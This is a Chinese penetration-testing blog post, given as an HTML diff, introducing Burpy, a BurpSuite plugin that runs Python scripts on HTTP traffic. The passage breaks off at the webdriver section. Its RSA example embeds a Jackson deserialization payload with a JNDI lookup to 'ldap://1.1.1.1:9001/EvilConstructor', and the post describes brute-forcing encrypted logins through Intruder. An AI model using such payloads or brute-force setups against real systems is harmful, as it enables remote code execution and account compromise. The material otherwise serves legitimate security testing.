@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"m0nst3r.me","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="转发自安全客，https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;206430   Burpy是一款能够打通BurpSuite和Python之间任督二脉的插件，从此之后，你可以用你的python任意处理Http包了！  Burpy首先，BurpSuite插件已经那么多了，真的缺这一个？面对这个To be, or not to be的灵魂之问，咱们先回答一下下面的问题：  你的Bur">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打通BurpSuite与Python之间的任督二脉">
+<meta property="og:url" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89.html">
+<meta property="og:site_name" content="m0nst3r&#39;s blog">
+<meta property="og:description" content="转发自安全客，https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;206430   Burpy是一款能够打通BurpSuite和Python之间任督二脉的插件，从此之后，你可以用你的python任意处理Http包了！  Burpy首先，BurpSuite插件已经那么多了，真的缺这一个？面对这个To be, or not to be的灵魂之问，咱们先回答一下下面的问题：  你的Bur">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-09-58-05.png">
+<meta property="og:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-10-06-59.png">
+<meta property="og:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-10-07-28.png">
+<meta property="og:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/base64_test.gif">
+<meta property="og:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/rsa_test.gif">
+<meta property="og:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/processor_test.gif">
+<meta property="og:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/webdriver_test.gif">
+<meta property="og:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/auto.gif">
+<meta property="article:published_time" content="2020-05-21T11:31:21.000Z">
+<meta property="article:modified_time" content="2022-08-08T14:27:53.030Z">
+<meta property="article:author" content="m0nst3r">
+<meta property="article:tag" content="burpsuite">
+<meta property="article:tag" content="burpy">
+<meta property="article:tag" content="python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-09-58-05.png">
+
+
+<link rel="canonical" href="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89.html","path":"burpsuite/打通BurpSuite与Python之间的任督二脉.html","title":"打通BurpSuite与Python之间的任督二脉"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>打通BurpSuite与Python之间的任督二脉 | m0nst3r's blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">m0nst3r's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Hello, Bugs</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Burpy"><span class="nav-number">1.</span> <span class="nav-text">Burpy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%9C%E7%94%A8"><span class="nav-number">1.1.</span> <span class="nav-text">作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%E3%80%81UI%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.2.</span> <span class="nav-text">功能、UI介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E6%80%8E%E4%B9%88%E5%86%99"><span class="nav-number">1.3.</span> <span class="nav-text">脚本怎么写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">1.3.1.</span> <span class="nav-text">编码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E5%AF%86"><span class="nav-number">1.3.2.</span> <span class="nav-text">加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload-processor"><span class="nav-number">1.3.3.</span> <span class="nav-text">payload processor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#webdriver"><span class="nav-number">1.3.4.</span> <span class="nav-text">webdriver</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Auto-Enc-x2F-Dec"><span class="nav-number">1.3.5.</span> <span class="nav-text">Auto Enc&#x2F;Dec</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">1.4.</span> <span class="nav-text">结语</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">m0nst3r</p>
+  <div class="site-description" itemprop="description">Web安全、渗透测试、网络安全、代码审计、逆向、编程</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://m0nst3r.me/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="m0nst3r">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="m0nst3r's blog">
+      <meta itemprop="description" content="Web安全、渗透测试、网络安全、代码审计、逆向、编程">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="打通BurpSuite与Python之间的任督二脉 | m0nst3r's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          打通BurpSuite与Python之间的任督二脉
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-05-21 19:31:21" itemprop="dateCreated datePublished" datetime="2020-05-21T19:31:21+08:00">2020-05-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-08-08 22:27:53" itemprop="dateModified" datetime="2022-08-08T22:27:53+08:00">2022-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/category/burpsuite/" itemprop="url" rel="index"><span itemprop="name">burpsuite</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <blockquote>
+<p>转发自安全客，<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/206430">https://www.anquanke.com/post/id/206430</a></p>
+</blockquote>
+<blockquote>
+<p>Burpy是一款能够打通BurpSuite和Python之间任督二脉的插件，从此之后，你可以用你的python任意处理Http包了！</p>
+</blockquote>
+<h2 id="Burpy"><a href="#Burpy" class="headerlink" title="Burpy"></a>Burpy</h2><p>首先，BurpSuite插件已经那么多了，真的缺这一个？<br>面对这个<code>To be, or not to be</code>的灵魂之问，咱们先回答一下下面的问题：</p>
+<ul>
+<li>你的BurpSuite中有多少插件？</li>
+<li>你有没有这样的情况：有些工作我用大python写的，测试的时候需要burpsuite，所以干活的时候是不断地在命令行、Burpsuite、浏览器三个之间来回切换。</li>
+</ul>
+<p>我就遇到一个RSA加密的流量，没有这个插件，我干活的状态应该是这样的：</p>
+<ul>
+<li>编写一个RSA加密脚本</li>
+<li>打开一个命令行，执行命令把我的payload加密</li>
+<li>右键复制</li>
+<li>切换到BurpSuite，粘贴加密之后的payload</li>
+<li>发送请求，分析返回结果</li>
+<li>切换到命令行，更换payload，执行python脚本加密</li>
+<li>再复制</li>
+<li>再粘贴</li>
+<li>再发送请求<br>….</li>
+</ul>
+<p>上面过程我才测试了两个payload，如果你有50个payload，你是不是想把电脑摔了？或者问候一下某人先人？</p>
+<p>有朋友可能会说了，我有插件呀！<br>对，RSA可以弄个插件。那下一个活，不是RSA了，加了签名怎么办？<br>答：再写个插件！<br>对，如果下一个活，加密&#x2F;签名算法不一样，比如有些加了时间戳，取url中后6位与时间戳合并，算32位的md5之后，把md5从中间劈开，前16位做key&#x2F;后16位做iv，做了AES呢？<br>答：再写个插件！<br>….</p>
+<p>那结果可能是，你的BurpSuite中装满了各式各样的插件！</p>
+<p>假设上面的情况下，你还需要做Intruder的动作，可你的插件只做了加密，怎么办？<br>答：改插件！</p>
+<p>如果你的回答跟上面一致，那么请大佬收下我的膝盖！</p>
+<p>不是每个人都快速开发一个插件，而不同的活，用到的插件也不一定完全一样，并且改插件的话，需要了解BurpSuite内部的东西，这限制了团队内其他人员的发挥。</p>
+<p>在深深的体验了上面不同情况下的痛楚之后，一个来自CFCA信息安全部的同志，小心翼翼地打开了破解版本的idea，学习了<code>Brida</code>插件的代码之后，通过大量复制、粘贴和修改之后，完成了一个他心目中的那个插件——<code>Burpy</code>～</p>
+<p>从此之后，它的BurpSuite中只有一个插件，那就是<code>Burpy</code>。（当然有时会用一下Brida）</p>
+<p><code>Burpy</code>，一个Burpy胜过千万个插件，是您居家日站的必备良器！<br>渗透测试人员必备两个技能：BurpSuite工具和Python脚本，<code>Burpy</code>就是打通这任督二脉的神器！</p>
+<p>恩，字数上应该差不多了，下面进入正题。</p>
+<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>执行指定python脚本，并将处理结果返回给BurpSuite。</p>
+<h3 id="功能、UI介绍"><a href="#功能、UI介绍" class="headerlink" title="功能、UI介绍"></a>功能、UI介绍</h3><p><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-09-58-05.png"><br>是不是很眼熟？简直就是<code>Brida</code>的亲兄弟有没有！这点恰恰证明了作为唯一开发者的我的Java编程功底～对，就是很浅。</p>
+<p>这里有个注意事项：要用python2。</p>
+<p>在<code>Burpy PY file path:</code>里面指定好你自己的python脚本，点击<code>start server</code>，就可以开心的干活了。</p>
+<p>大家注意看这里：<br><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-10-06-59.png"><br>这个地方是一些开关，为了右键菜单更加简洁。点上之后，右键菜单会有变化。</p>
+<p>把这些开关都点上，来看一眼右键菜单：<br><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/2020-05-21-10-07-28.png"></p>
+<p><code>Burpy Main</code>会自动调用我们脚本中的<code>main</code>方法<br><code>Burpy Enc</code>会自动调用<code>encrypt</code>方法<br>依次类推。</p>
+<p><code>Enable Processor</code>和<code>Enable Auto Enc/Dec</code>这两个开关的功能比较特殊，这里分开说一下</p>
+<p>打开<code>enable processor</code>之后，在使用<code>Intruder</code>进行暴力破解之类的动作时，如果payload需要进行加密或签名，我们就可以把加密&#x2F;签名的算法实现到自己有python脚本的<code>processor</code>函数中，参见下面的例子。</p>
+<p>打开<code>Enable Auto Enc/Dec</code>之后，你就自由了！加密？不存在的！参见下面的例子。</p>
+<h3 id="脚本怎么写"><a href="#脚本怎么写" class="headerlink" title="脚本怎么写"></a>脚本怎么写</h3><p>在我们自己的脚本中，要新建一个<code>Burpy</code>类，此类在<code>start server</code>的时候会进行初始化。<br>Burpy类有这样几个函数：<code>main</code>, <code>encrypt</code>, <code>decrypt</code>, <code>sign</code>, <code>processor</code>，作用咱们上面提到了，不再重复</p>
+<p>其中，<code>main</code>函数是必须的，因为右键菜单始终会有一个<code>Burpy Main</code>，这个菜单就是调用的<code>main</code>函数。（如果你连<code>Burpy Main</code>也不调用，这个函数也是可以没有的）</p>
+<p>其他的函数看需要，可有可无。之所以这样设计是因为，不是每次你都要进行加解密操作，有时候你只需要进行个md5或者base64就行。贴不贴心？</p>
+<p><code>Talk is cheap, show me the code!</code><br>下面咱们看几个例子吧！</p>
+<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>这是一个base64编码的例子，其实呢，base64功能很多插件都有，burpsuite自己也有，这里只是为了说明一下Burpy的用法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burpy</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    header is list, append as your need</span></span><br><span class="line"><span class="string">    body is string, modify as your need</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        body = base64.b64encode(body)</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">processor</span>(<span class="params">self, payload</span>):</span><br><span class="line">        <span class="keyword">return</span> payload+<span class="string">&quot;burpyed&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>很简单对不对？<br>Burpy的灵活之处就在这里，它把整个HTTP数据包都发送到脚本进行处理，HTTP头保存在<code>header</code>列表中，<code>body</code>是个字符串，想怎么处理就怎么处理，处理完把header和body返回就搞定。</p>
+<p><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/base64_test.gif"><br>上面的函数中，我们只用到了<code>encrypt</code>，其实其他函数都可以删掉的</p>
+<h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>上面的例子太简单了有没有，这个功能很鸡肋，burpsuite中使用<code>ctrl+b</code>快捷键就完成了，还得写个脚本，这不是大晴天打伞——多此一举吗？<br>来来来，看看下面这个例子。<br>代码有些长….<br>先在这说明一下：下面代码是做RSA加密的。在这个项目中，用户名和密码是经过RSA加密之后传给服务器的，服务器会解密，通过其他漏洞拿到源代码，分析之后发现可能存在Jackson反序列化漏洞，于是写了这个脚本来测试。<br>这个RSA加密中会取当前时间，再取一个6位随机字符，拼接成一个<code>nonce</code>，而公钥可以在浏览器的JS里面找到。如果没有这个插件，想做这件事基本上很难，找到js代码之后还要在浏览器是执行js代码，复制粘贴等等，幸好我们有<code>Burpy</code>，来看下脚本和体验如何吧！（如下内容已做脱敏）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burpy</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        body_json = json.loads(body)</span><br><span class="line">        username = <span class="built_in">repr</span>(body_json.get(<span class="string">&quot;username&quot;</span>))</span><br><span class="line">        body_json[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;_XXXX_ENC_:V1:RSA:XXXX0001:&quot;</span> + self.rsa_enc(username)</span><br><span class="line">        body = json.dumps(body_json)</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rsa_enc</span>(<span class="params">self,data</span>):</span><br><span class="line">        <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">        <span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line">        <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line">        <span class="keyword">import</span> time</span><br><span class="line">        <span class="keyword">import</span> random</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">        s = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            s += <span class="built_in">str</span>(random.randint(<span class="number">1</span>,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">        e = <span class="built_in">str</span>(t) + s</span><br><span class="line"></span><br><span class="line">        i = <span class="built_in">dict</span>()</span><br><span class="line">        i[<span class="string">&quot;text&quot;</span>] = data</span><br><span class="line">        i[<span class="string">&quot;timestamp&quot;</span>] = t+<span class="number">5</span></span><br><span class="line">        i[<span class="string">&quot;nonce&quot;</span>] = e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        pubStr = <span class="string">&quot;MIIxxxxxx9hnjsRkHvPUVT91pl9fR9VKn/F/JbwrNlDZQOnd0AXxxxxxxxcP61EVOdEqAdtA1law/6Z9O4c1nHaDBblx3R9Sr7Lxxxxxx0kxoox7LlAInToUqU1ofWNf0FlF+A6kd1wZhil1Iha9NS8z7UfMx92jxh9RtGWFKxxxxxl4UJsQoS7krDN6skb8SLwga4QYUU3ua8GCxxxxxxx&quot;</span></span><br><span class="line">        msg = json.dumps(i)</span><br><span class="line">        <span class="comment">#msg = &quot;1565246122420&quot; + msg</span></span><br><span class="line">        keyDER = b64decode(pubStr)</span><br><span class="line">        keyPub = RSA.importKey(keyDER)</span><br><span class="line">        cipher = PKCS1_v1_5.new(keyPub)</span><br><span class="line">        ct = cipher.encrypt(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        ect = b64encode(ct)</span><br><span class="line">        <span class="keyword">return</span> ect</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    b = Burpy()</span><br><span class="line">    header = []</span><br><span class="line">    body = <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;text&quot;: [&quot;org.hibernate.jmx.StatisticsService&quot;,&#123;&quot;sessionFactoryJNDIName&quot;: &quot;ldap://1.1.1.1:9001/EvilConstructor&quot;&#125;]&#125;, &quot;svcCode&quot;: &quot;client:009&quot;, &quot;password&quot;: &quot;2&quot;, &quot;orgCode&quot;: &quot;xxxx&quot;&#125;&#x27;</span></span><br><span class="line">    header1,body1 = b.main(header, body)</span><br><span class="line">    <span class="built_in">print</span> body1</span><br></pre></td></tr></table></figure>
+<p>来体验一把：<br><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/rsa_test.gif"></p>
+<h4 id="payload-processor"><a href="#payload-processor" class="headerlink" title="payload processor"></a>payload processor</h4><p>怎么样？有没有感觉通畅了许多？</p>
+<p>这还不是最令人兴奋的。来一起看一下<code>payload processor</code>。</p>
+<p>试想一下，你想暴力破解上面这种系统的用户名密码，能做到不？难。<br>但是，用<code>Burpy</code>只需要像下面这样设置一下就可以跑了：</p>
+<p>首先，勾选<code>Enable Processor</code>，<br>然后，在我们的脚本中加入<code>processor</code>函数，并编写逻辑调用已经写好的<code>rsa_enc</code>函数<br>然后就是常规操作，看这里：<br><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/processor_test.gif"></p>
+<p>其实，这个<code>processor</code>加密之后的密文前边应该再加上一些字符串，但我实在太懒了，你们应该都知道怎么改这个脚本的，我相信你们。</p>
+<p>看到这里，有同学可能问了，恩恩，很好，很6,但是，为啥这个脚本这么麻烦？直接接数据返回不就行了吗？</p>
+<p>当当当当，你说的对，但是，一次偶然的机会（其实是经常遇到），我需要测试一个APP，它加载一个web页面，里面有js代码，js代码经过了webpack。<br>其中，流量是加密的，怎么办？</p>
+<p>往下看！</p>
+<h4 id="webdriver"><a href="#webdriver" class="headerlink" title="webdriver"></a>webdriver</h4><p>首先推荐一个模块——<code>moduleRaid.js</code>，自己去github上找吧，不多解释，因为我也不懂它怎么做到的。<br>反正，用了这个之后，你就可能在浏览器控制台下拉调用webpack之后的一些js的功能，如加密&#x2F;解密！</p>
+<p>很神奇有没有，但是问题来了，我们测试的是APP呀，又不是浏览器上的web站！<br>难道要打开手机APP内部的<code>webview</code>的控制台，再用手机键盘输入那些js命令？<br>然后怎么从手机webview控制台中把js执行结果复制出来？</p>
+<p>这里就用到了<code>webdriver</code>，我们可以使用python启动一个浏览器，让浏览器去访问APP中浏览的页面！<br>而且，我们还能通过python脚本把我们的JS代码加载到这个浏览器当中！<br>而且，我们还能通过python脚本在这个浏览器中执行js代码！<br>而且，我们还有<code>Burpy</code>！</p>
+<p>来看一下怎么搞！</p>
+<p>先来看下代码（已脱敏）：</p>
